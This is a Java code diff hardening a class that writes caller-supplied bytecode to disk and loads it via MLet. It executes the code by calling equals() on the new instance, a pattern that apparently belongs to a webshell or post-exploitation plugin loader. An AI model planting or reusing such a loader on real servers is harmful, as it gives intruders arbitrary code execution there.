@@ -20,7 +20,8 @@ import java.util.UUID;
  */
 public class PluginComponent implements Runnable {
 
-    
+    private static final int MAX_PLUGIN_BYTES = 10 * 1024 * 1024;
+
     private HashMap<String, Object> params;
     private HashMap<String, Object> results;
 
@@ -34,7 +35,7 @@ public class PluginComponent implements Runnable {
         } catch (Throwable t) {
             if (results == null) results = new java.util.HashMap<String, Object>();
             results.put("code", Integer.valueOf(500));
-            results.put("msg", t.getMessage());
+            results.put("msg", t.getMessage() != null ? t.getMessage() : t.getClass().getName());
         }
         if (results != null) {
             try { h.invoke(null, null, new Object[]{results}); } catch (Throwable ignored) {}
@@ -46,17 +47,31 @@ public class PluginComponent implements Runnable {
      * 主要执行方法
      */
     public void invoke() throws Exception {
-        byte[] bytecode = (byte[]) params.get("pluginBytecode");
-        HashMap<String, Object> pluginParam = copyStringObjectMap(params.get("pluginParam"));
-
-        if (bytecode == null || bytecode.length == 0) {
-            throw new IllegalArgumentException("pluginBytecode 不能为空");
+        Object rawBytecode = params.get("pluginBytecode");
+        if (!(rawBytecode instanceof byte[]) || ((byte[]) rawBytecode).length == 0) {
+            results.put("code", Integer.valueOf(400));
+            results.put("msg", "pluginBytecode 必须是非空 byte[]");
+            return;
         }
+        byte[] bytecode = (byte[]) rawBytecode;
+        if (bytecode.length > MAX_PLUGIN_BYTES) {
+            results.put("code", Integer.valueOf(400));
+            results.put("msg", "pluginBytecode 超过 10 MB 上限");
+            return;
+        }
+
+        Object rawPluginParam = params.get("pluginParam");
+        if (rawPluginParam != null && !(rawPluginParam instanceof Map)) {
+            results.put("code", Integer.valueOf(400));
+            results.put("msg", "pluginParam 必须是 Map");
+            return;
+        }
+        HashMap<String, Object> pluginParam = copyStringObjectMap(rawPluginParam);
 
         Class<?> pluginClass = loadPluginClass(bytecode);
         
         // 创建插件实例并执行
-        Object pluginInstance = pluginClass.getDeclaredConstructor().newInstance();
+        Object pluginInstance = pluginClass.newInstance();
         pluginInstance.equals(pluginParam);
         
         // 获取执行结果
@@ -75,23 +90,27 @@ public class PluginComponent implements Runnable {
     private Class<?> loadPluginClass(byte[] bytecode) throws Exception {
         String className = readClassName(bytecode);
         File root = createTempDirectory();
-        File classFile = new File(root, className.replace('.', File.separatorChar) + ".class");
-        File parent = classFile.getParentFile();
-        if (parent != null && !parent.exists() && !parent.mkdirs() && !parent.isDirectory()) {
-            throw new IOException("无法创建插件临时目录: " + parent.getAbsolutePath());
-        }
-
-        FileOutputStream out = null;
         try {
-            out = new FileOutputStream(classFile);
-            out.write(bytecode);
-        } finally {
-            if (out != null) {
-                try { out.close(); } catch (IOException ignored) {}
+            File classFile = new File(root, className.replace('.', File.separatorChar) + ".class");
+            String rootPath = root.getCanonicalPath() + File.separator;
+            if (!classFile.getCanonicalPath().startsWith(rootPath)) {
+                throw new IOException("class 文件中的类名路径无效: " + className);
             }
-        }
+            File parent = classFile.getParentFile();
+            if (parent != null && !parent.exists() && !parent.mkdirs() && !parent.isDirectory()) {
+                throw new IOException("无法创建插件临时目录: " + parent.getAbsolutePath());
+            }
 
-        try {
+            FileOutputStream out = null;
+            try {
+                out = new FileOutputStream(classFile);
+                out.write(bytecode);
+            } finally {
+                if (out != null) {
+                    try { out.close(); } catch (IOException ignored) {}
+                }
+            }
+
             MLet mlet = new MLet(new URL[]{root.toURI().toURL()},
                     Thread.currentThread().getContextClassLoader());
             return Class.forName(className, true, mlet);
